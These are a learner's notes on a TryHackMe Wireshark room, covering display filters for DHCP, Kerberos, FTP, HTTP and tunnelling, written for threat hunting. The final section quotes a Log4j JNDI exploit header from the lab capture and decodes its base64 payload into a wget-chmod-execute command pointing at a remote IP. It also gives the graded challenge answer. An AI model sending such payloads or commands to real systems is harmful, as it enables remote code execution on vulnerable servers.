room link: https://tryhackme.com/room/wiresharktrafficanalysis
level: medium

# ARP Spoofing and Flooding
finding arp request created by attacker-> 
using sender's ip attribute from packet details and applying it as a filter


# Identifying Hosts: DHCP, NetBIOS, and Kerberos (TryHackMe)

## 🧠 Objective
Learn how to identify hosts and users in network traffic using DHCP, NetBIOS, and Kerberos protocols in Wireshark.

---

## 🔍 DHCP Analysis

### Goal
Identify hosts and requested IP addresses using DHCP traffic.

### Method
- Filter DHCP request packets:
  dhcp.option.dhcp == 3

- To find a specific device by hostname:
  dhcp.option.hostname contains "<device_name>"

### Key Idea
DHCP packets reveal:
- Hostnames
- Requested IP addresses
- Network activity of devices

---

## 🌐 NetBIOS Analysis

### Goal
Identify workstation registration requests.

### Method
- Look for NetBIOS Name Service (NBNS) queries
- Filter by hostname:
  nbns.name contains "<workstation_name>"

### Key Idea
NetBIOS helps map:
- Hostnames to IP addresses
- Workstation presence in the network

---

## 🔐 Kerberos Analysis

### Goal
Identify users and hostnames from authentication traffic.

### Method

#### 🔹 Finding a specific user:
- kerberos.CNameString contains "<username>"
- Exclude machine accounts:
  !(kerberos.CNameString contains "$")

#### 🔹 Identifying hostnames:
- kerberos.CNameString contains "$"

### Key Idea
- User accounts → no `$`
- Machine accounts → end with `$`

---

## 💡 What I Learned
- DHCP can be used to track device identity and IP requests
- NetBIOS helps identify workstation names in a network
- Kerberos traffic reveals both users and machine accounts
- Filtering is essential for efficient packet analysis

---

## ⚠️ Note
This writeup focuses on learning concepts and methodology.  
Sensitive details such as actual answers, flags, or target-specific data are intentionally omitted.



# Tunnelling Traffic: ICMP and DNS (TryHackMe)

## 🧠 Objective
Learn how attackers may abuse ICMP and DNS protocols to tunnel traffic, hide communication, or transfer data through trusted network protocols.

---

# 🔍 ICMP Tunnelling Analysis

ICMP is normally used for diagnostics (such as ping), but attackers may misuse it to carry hidden traffic.

## Suspicious ICMP Filter

wireshark
(data.len > 64) and (icmp contains "ssh" or icmp contains "ftp" or icmp contains "tcp" or icmp contains "http")


# Cleartext Protocol Analysis: FTP

--> Request = client
--> Response = server

response has one key attribute: Code
request has two attribute: Command & Argument(arg)
  - Commands are like: USER, PASS, CWD, LIST, MKD, RMD, MTDM, SITE, SIZE
  
## Overview
FTP is used to transfer files but standard FTP does not encrypt usernames, passwords, or file data. This makes it useful to analyze in Wireshark and risky in insecure networks.

## Risks
- Credential theft
- Unauthorized access
- MITM attacks
- Malware upload/download
- Data exfiltration

## Basic Filter
ftp

## FTP Response Codes

### x1x Information
- 211 = System status
- 212 = Directory status
- 213 = File status

Filter:
ftp.response.code == 211

### x2x Connection
- 220 = Service ready
- 227 = Entering passive mode
- 228 = Long passive mode
- 229 = Extended passive mode

Filter:
ftp.response.code == 227

### x3x Authentication
- 230 = Login success
- 231 = Logout
- 331 = Username valid, need password
- 430 = Invalid username/password
- 530 = Not logged in / invalid password

Filter:
ftp.response.code == 230

## FTP Commands

Username:
ftp.request.command == "USER"

Password:
ftp.request.command == "PASS"

Specific password:
ftp.request.arg == "password"

Other commands:
- CWD = Change directory
- LIST = List files

## Threat Hunting

Failed logins:
ftp.response.code == 530

Failed logins for target username:
(ftp.response.code == 530) and (ftp.response.arg contains "username")

Password spray:
(ftp.request.command == "PASS") and (ftp.request.arg == "password")

## What I Learned
- FTP sends data in cleartext
- USER and PASS may expose credentials
- Response codes reveal login behavior
- Repeated failures may indicate brute-force attempts

## Recommendation
Use secure alternatives:
- SFTP
- FTPS
- SCP

# Cleartext Protocol Analysis: HTTP

## 🔍 Why HTTP Analysis Matters

HTTP traffic analysis can help detect:

- Phishing pages
- Web attacks
- Data exfiltration
- Command and Control (C2) traffic

---

## 🌐 Basic Wireshark Filters

### Global Search
http
http2

> Note: HTTP/2 is a newer version of HTTP that improves performance and uses binary framing, but the core request/response idea remains the same.

---

## 📨 HTTP Request Methods

Common methods that are useful in analysis:

- `GET` → retrieve data
- `POST` → submit data

### Filters
http.request.method == "GET"
http.request.method == "POST"
http.request

### Key Insight
- `GET` requests are useful for tracking page/resource access
- `POST` requests are important because they may contain submitted data, credentials, or malicious payloads

---

## 📥 HTTP Response Status Codes

Useful status codes to review during traffic analysis:

- `200` → OK
- `301` → Moved Permanently
- `302` → Moved Temporarily
- `400` → Bad Request
- `401` → Unauthorized
- `403` → Forbidden
- `404` → Not Found
- `405` → Method Not Allowed
- `408` → Request Timeout
- `500` → Internal Server Error
- `503` → Service Unavailable

### Filters
http.response.code == 200


### Key Insight
Response codes can quickly reveal:
- successful communication
- access failures
- missing resources
- possible misconfigurations or attack attempts

---

## 🧩 Useful HTTP Parameters

### Filters
http.user_agent contains "keyword"
http.request.uri contains "admin"
http.request.full_uri contains "admin"
http.server contains "apache"
http.host contains "keyword"
http.host == "keyword"
http.connection == "Keep-Alive"
data-text-lines contains "keyword"

### Key Insight
Important HTTP fields include:
- **User-Agent** → identifies browser/tool information
- **Request URI / Full URI** → shows requested resource
- **Server** → may reveal web server software
- **Host** → shows target hostname
- **Connection** → indicates session behavior
- **Cleartext data** → may expose sensitive information in requests/responses

---

## 🕵️ User-Agent Analysis

The `User-Agent` field is useful for spotting suspicious or unusual HTTP activity.

### Global Filter
http.user_agent

### Things to Look For
- Different user-agent strings from the same host in a short time
- Non-standard or custom user agents
- Small spelling differences in known user agents
- Security tool names in the header
- Payload-like data in the user-agent field

### Example Filter
(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")

### Key Insight
User-Agent analysis is helpful, but it should not be trusted alone. Attackers can modify user-agent values to appear normal.

---

## ⚠️ Example Threat Hunting Use Case: Log4j

A practical HTTP investigation can include looking for suspicious cleartext patterns related to known attacks.

### Indicators Mentioned in This Exercise
- Attack may begin with a `POST` request
- Known suspicious patterns may include:
  - `jndi`
  - `Exploit`

### Example Filters
http.request.method == "POST"
(ip contains "jndi") or (ip contains "Exploit")
(frame contains "jndi") or (frame contains "Exploit")
(http.user_agent contains "$") or (http.user_agent contains "==")

### Key Insight
Cleartext HTTP analysis can sometimes expose malicious payload delivery or exploitation attempts directly in packet contents.

---

## 🛠️ Tool Used
- Wireshark

---

## 💡 What I Learned
- HTTP is one of the most valuable cleartext protocols in traffic analysis
- Request methods and response codes provide quick investigation clues
- User-Agent fields can help reveal anomalies or attacker tools
- Cleartext protocols may expose sensitive or malicious content directly
- HTTP filtering is useful for both troubleshooting and threat hunting

---

## ⚠️ Note
This writeup focuses on protocol understanding and methodology only.  
Specific challenge answers, flags, and target-specific solutions are intentionally excluded.
## Q: Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)

User-Agent: ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
  --> message: d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==
  --> decode using base64 => wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
  --> download lh.sh file from remote ip 62.210.130.250 and give execute premission to the file and immediately run it

---